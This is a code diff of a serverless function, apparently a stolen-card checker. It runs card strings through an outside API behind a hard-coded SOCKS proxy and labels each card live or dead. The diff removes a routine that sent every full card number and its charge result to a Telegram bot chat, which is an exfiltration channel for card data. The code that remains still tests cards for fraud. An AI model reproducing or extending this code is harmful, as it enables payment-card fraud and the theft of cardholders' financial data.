@@ -9,53 +9,12 @@ const corsHeaders = {
 
 const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
 const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
-const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
-const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN")!;
-const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID")!;
 
 // API Configuration
 const API_BASE_URL = "http://web-production-7ad4f.up.railway.app/api";
 const PROXY_IP = "138.197.124.55";
 const PROXY_PORT = "9150";
 const PROXY_TYPE = "sock5";
-
-// Send debug to admin Telegram
-const sendAdminDebug = async (
-  cc: string,
-  result: string,
-  rawResponse: string,
-  apiUrl: string
-): Promise<void> => {
-  try {
-    const parts = cc.split('|');
-    const maskedCard = parts[0]?.slice(0, 6) + '****' + parts[0]?.slice(-4);
-    
-    const emoji = result === 'CHARGED' ? '✅' : result === 'DECLINED' ? '❌' : '⚠️';
-    
-    const message = `${emoji} STRIPE CHARGE $8 - ${result}
-
-Card: ${maskedCard}
-Full: ${cc}
-Amount: $8.00
-
-API URL:
-${apiUrl}
-
-Raw API Response:
-${rawResponse.substring(0, 3000)}`;
-
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: ADMIN_TELEGRAM_CHAT_ID,
-        text: message
-      })
-    });
-  } catch (error) {
-    console.error('[STRIPE-CHARGE] Admin debug failed:', error);
-  }
-};
 
 // Call the API and get response
 const callApi = async (cc: string): Promise<{ status: string; message: string; rawResponse: string }> => {
@@ -113,17 +72,11 @@ const callApi = async (cc: string): Promise<{ status: string; message: string; r
       }
     }
     
-    // Send to admin
-    const displayResult = apiStatus === 'live' ? 'CHARGED' : apiStatus === 'dead' ? 'DECLINED' : 'UNKNOWN';
-    await sendAdminDebug(cc, displayResult, rawText, apiUrl);
-    
     return { status: apiStatus, message: apiMessage, rawResponse: rawText };
     
   } catch (error) {
     const errMsg = error instanceof Error ? error.message : 'Request failed';
     console.error(`[STRIPE-CHARGE] API error: ${errMsg}`);
-    
-    await sendAdminDebug(cc, 'ERROR', errMsg, apiUrl);
     
     return { status: 'unknown', message: errMsg, rawResponse: errMsg };
   }
